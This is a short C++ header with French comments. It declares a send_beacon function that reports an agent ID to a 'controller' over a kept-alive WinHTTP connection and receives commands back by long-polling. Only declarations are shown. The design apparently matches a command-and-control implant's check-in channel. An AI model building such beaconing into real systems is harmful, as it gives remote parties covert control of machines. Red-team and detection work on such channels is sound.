#pragma once
#include <string>

enum class SendResult {
    Ok,           // 200 : body = commande, ou vide s'il n'y a rien à faire
    HttpError,    // réponse HTTP non-200 : error = code de statut
    NetworkError  // échec WinHTTP : error = GetLastError()
};

struct BeaconReply {
    SendResult    result = SendResult::NetworkError;
    std::string   body;
    unsigned long error  = 0;
};

// Envoie un beacon et bloque jusqu'à la réponse du contrôleur (long-poll).
// La connexion HTTP est conservée entre deux appels (keep-alive).
BeaconReply send_beacon(const std::string& agent_id, const std::string& message);
